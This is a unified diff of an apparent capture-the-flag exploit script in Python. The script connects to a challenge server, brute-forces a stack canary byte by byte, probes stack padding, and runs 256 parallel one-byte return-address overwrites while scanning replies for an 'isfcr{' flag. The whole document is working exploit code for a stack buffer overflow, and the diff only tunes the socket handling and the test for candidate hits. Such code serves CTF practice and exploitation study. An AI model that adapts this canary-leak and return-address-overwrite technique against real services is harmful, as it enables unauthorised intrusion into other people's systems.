@@ -2,13 +2,14 @@
 import socket,struct,time,concurrent.futures,collections,re,sys
 H,P="0.cloud.chals.io",27813
 FLAG=re.compile(rb'isfcr\{[^}\r\n]{1,250}\}')
-def probe(payload,limit=.55):
+def probe(payload,limit=.55,finish=False):
     raw=b''; closed=False
     try:
         with socket.create_connection((H,P),timeout=3) as s:
             s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
             s.settimeout(.13)
             s.sendall(struct.pack(">H",len(payload))+payload)
+            if finish:s.shutdown(socket.SHUT_WR)
             deadline=time.monotonic()+limit
             while time.monotonic()<deadline:
                 try:
@@ -16,7 +17,7 @@ def probe(payload,limit=.55):
                     if not c:closed=True;break
                     raw+=c
                     if FLAG.search(raw):print("FLAG FOUND",repr(FLAG.search(raw).group()),flush=True);sys.exit(0)
-                    if re.search(rb'logged \d+\.',raw):break
+                    if re.search(rb'logged \d+\.',raw) and not finish:break
                 except socket.timeout:continue
                 except OSError: closed=True;break
     except OSError:pass
@@ -48,15 +49,15 @@ for n in range(1,8):
     print('CANARY SO FAR',canary.hex(),flush=True)
 print('FULL_CANARY',canary.hex(),flush=True)
 for extra in [b'',b'B'*1,b'B'*4,b'B'*7,b'B'*8,b'B'*9,b'B'*16,b'\x00'*8]:
-    print('STACK',len(extra),probe(prefix+canary+extra,1.4),flush=True)
+    print('STACK',len(extra),probe(prefix+canary+extra,1.4,True),flush=True)
 # Probe a 1-byte RIP overwrite with plausible saved RBP; if win function nearby print flag.
 for rbp in [b'B'*8,b'\x00'*8]:
     print('RBP',rbp.hex(),flush=True)
     def f(v):
-        stat,data=probe(prefix+canary+rbp+bytes([v]),1.0)
+        stat,data=probe(prefix+canary+rbp+bytes([v]),1.1,True)
         return v,stat,data
     with concurrent.futures.ThreadPoolExecutor(max_workers=12) as pool:
         for v,stat,data in pool.map(f,range(256)):
-            if stat=='ACK' or b'flag' in data.lower() or b'isfcr{' in data:
+            if b'flag' in data.lower() or b'isfcr{' in data or b'logged' not in data:
                 print('RIP CANDIDATE',hex(v),stat,repr(data),flush=True)
 print('DONE',flush=True)
